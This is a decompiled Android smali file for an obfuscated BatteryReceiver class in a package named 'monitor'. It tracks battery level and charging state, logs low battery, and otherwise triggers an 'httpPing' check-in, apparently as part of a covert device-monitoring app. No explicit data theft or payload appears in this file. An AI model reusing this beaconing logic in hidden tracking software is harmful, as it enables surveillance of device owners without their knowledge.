.class public Lcom/network/android/monitor/observer/BatteryReceiver;
.super Landroid/content/BroadcastReceiver;


# static fields
.field public static a:Ljava/lang/String;

.field private static b:Ljava/lang/String;

.field private static c:Ljava/lang/String;

.field private static d:Ljava/lang/String;

.field private static e:Ljava/lang/String;

.field private static f:Ljava/lang/String;

.field private static g:I

.field private static h:I

.field private static i:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v0, 0x0

    sput-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->b:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->c:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->d:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->e:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->f:Ljava/lang/String;

    const/16 v0, 0x64

    sput v0, Lcom/network/android/monitor/observer/BatteryReceiver;->g:I

    const-string v0, "Charging"

    sput-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->a:Ljava/lang/String;

    const/4 v0, -0x1

    sput v0, Lcom/network/android/monitor/observer/BatteryReceiver;->h:I

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "batteryHandler"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/network/android/monitor/observer/BatteryReceiver;->i:Landroid/os/Handler;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static a()I
    .locals 1

    sget v0, Lcom/network/android/monitor/observer/BatteryReceiver;->h:I

    return v0
.end method

.method public static a(Landroid/content/Context;)Ljava/lang/String;
    .locals 3

    sget-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->b:Ljava/lang/String;

    if-eqz v0, :cond_0

    sget-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->b:Ljava/lang/String;

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    :cond_0
    const/4 v0, 0x0

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.intent.action.BATTERY_CHANGED"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    move-result-object v0

    invoke-static {v0, p0}, Lcom/network/android/monitor/observer/BatteryReceiver;->a(Landroid/content/Intent;Landroid/content/Context;)V

    :cond_1
    sget-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->b:Ljava/lang/String;

    return-object v0
.end method

.method protected static a(Landroid/content/Intent;Landroid/content/Context;)V
    .locals 3

    if-eqz p0, :cond_0

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.BATTERY_CHANGED"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "level"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    sput v0, Lcom/network/android/monitor/observer/BatteryReceiver;->g:I

    const-string v0, "plugged"

    const/4 v1, -0x1

    invoke-virtual {p0, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    sput v0, Lcom/network/android/monitor/observer/BatteryReceiver;->h:I

    const-string v0, "level"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->b:Ljava/lang/String;

    const/4 v0, 0x5

    invoke-static {v0}, Lcom/network/android/monitor/observer/BatteryReceiver;->a(I)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BatteryReceiver low battary: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v2, Lcom/network/android/monitor/observer/BatteryReceiver;->g:I

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/4 v1, 0x1

    const/16 v2, 0x25

    invoke-static {p1, v1, v0, v2}, Lcom/network/android/j;->a(Landroid/content/Context;ZZS)Z

    :cond_0
    :goto_0
    return-void

    :cond_1
    sget-boolean v0, Lcom/network/android/j;->b:Z

    if-nez v0, :cond_0

    const-string v0, "httpPing"

    invoke-static {p1, v0}, Lcom/network/android/a/c;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "BatteryReceiver onReceive: "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static a(I)Z
    .locals 1

    sget v0, Lcom/network/android/monitor/observer/BatteryReceiver;->g:I

    if-gt v0, p0, :cond_0

    const/4 v0, 0x1

    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    sget-object v0, Lcom/network/android/monitor/observer/BatteryReceiver;->i:Landroid/os/Handler;

    new-instance v1, Lcom/network/android/monitor/observer/s;

    invoke-direct {v1, p0, p2, p1}, Lcom/network/android/monitor/observer/s;-><init>(Lcom/network/android/monitor/observer/BatteryReceiver;Landroid/content/Intent;Landroid/content/Context;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method
